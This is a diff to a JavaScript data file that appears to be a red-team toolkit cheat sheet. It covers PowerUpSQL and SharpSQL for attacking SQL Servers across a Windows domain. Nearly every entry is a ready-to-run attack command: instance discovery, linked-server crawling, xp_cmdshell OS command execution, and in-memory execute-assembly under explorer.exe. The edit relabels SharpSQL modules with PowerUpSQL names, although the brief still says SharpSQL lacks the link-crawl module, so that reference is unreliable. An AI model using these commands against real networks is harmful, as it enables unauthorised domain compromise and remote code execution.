@@ -2240,10 +2240,10 @@ var TOOLKIT = [
         name: "PowerUpSQL / SharpSQL",
         url: "https://github.com/NetSPI/PowerUpSQL",
         description: "Toolkits for discovering, auditing and attacking MS SQL Servers in an AD environment, including database-link crawling to xp_cmdshell.",
-        brief: "PowerUpSQL is NetSPI's PowerShell toolkit for finding and attacking SQL Servers across a domain — instance discovery via SPNs, privilege and role checks, linked-server enumeration, and crawling chains of database links to reach a server where the attacker is sysadmin and run OS commands with xp_cmdshell. SharpSQL is a C# implementation covering most of the same modules (Get-SQLInstanceDomain, Get-UserPrivs, Get-LinkedServers) for in-memory use; where SharpSQL lacks the link-crawl module, PowerUpSQL is compiled to an EXE (PS2EXE) so it can run through execute-assembly too.",
+        brief: "PowerUpSQL is NetSPI's PowerShell toolkit for finding and attacking SQL Servers across a domain — instance discovery via SPNs, privilege and role checks, linked-server enumeration, and crawling chains of database links to reach a server where the attacker is sysadmin and run OS commands with xp_cmdshell. SharpSQL is a C# implementation covering most of the same modules (Get-SQLInstanceDomain, Invoke-SQLAudit, Get-SQLServerLinkCrawl) for in-memory use; where SharpSQL lacks the link-crawl module, PowerUpSQL is compiled to an EXE (PS2EXE) so it can run through execute-assembly too.",
         quickReference: [
           { label: "Find domain SQL instances", cmd: "Get-SQLInstanceDomain" },
-          { label: "Check privileges on an instance", cmd: "Get-UserPrivs -Instance <sql>   |   Get-SQLServerLinkCrawl -Instance <sql>" },
+          { label: "Check privileges on an instance", cmd: "Invoke-SQLAudit -Instance <sql>   |   Get-SQLServerLinkCrawl -Instance <sql>" },
           { label: "OS command via link crawl", cmd: "Get-SQLServerLinkCrawl -Instance <sql> -Query \"exec master..xp_cmdshell 'whoami'\"" }
         ],
         sections: [
@@ -2251,7 +2251,7 @@ var TOOLKIT = [
             title: "Enumeration & Link Abuse",
             type: "commands",
             commands: [
-              { label: "SharpSQL — in-memory enumeration", cmd: "execute-assembly -p explorer.exe -t 80 '/path/SharpSQL.exe' 'Get-SQLInstanceDomain'\n'/path/SharpSQL.exe' 'Get-UserPrivs -Instance <sql-instance>'\n'/path/SharpSQL.exe' 'Get-LinkedServers -Instance <sql-instance>'" },
+              { label: "SharpSQL — in-memory enumeration", cmd: "execute-assembly -p explorer.exe -t 80 '/path/SharpSQL.exe' 'Get-SQLInstanceDomain'\n'/path/SharpSQL.exe' 'Invoke-SQLAudit -Instance <sql-instance>'\n'/path/SharpSQL.exe' 'Get-SQLServerLinkCrawl -Instance <sql-instance>'" },
               { label: "PowerUpSQL — crawl links and run OS commands", cmd: "# compile PowerUpSQL (with a Get-SQLServerLinkCrawl call) to EXE via PS2EXE, then:\nGet-SQLServerLinkCrawl -Instance <sql-instance> -Query \"exec master..xp_cmdshell 'whoami'\" -QueryTarget <linked-sql>" }
             ]
           },
